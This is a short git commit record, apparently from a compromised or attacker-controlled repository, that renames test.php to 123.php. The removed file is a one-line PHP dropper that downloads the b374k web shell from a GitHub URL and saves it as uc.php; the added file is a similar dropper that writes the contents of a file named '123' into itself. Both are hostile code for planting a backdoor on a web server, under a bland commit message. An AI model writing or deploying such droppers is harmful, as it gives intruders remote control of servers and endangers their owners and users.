f7ad1950876bf7db8eac51419ae9d909db493265
helnsnh <xiahsdjhsa22@outlook.com>
2025-06-25 16:23:41 +0800

    Update and rename test.php to 123.php

---
+++ 123.php
@@ -0,0 +1,1 @@
+<?php file_put_contents('123.php',file_get_contents('123'));?>
--- test.php
+++
@@ -1,1 +0,0 @@
-<?php file_put_contents('uc.php',file_get_contents('https://github.com/charsets/b374k/raw/master/b374k.3.2.php'));?>
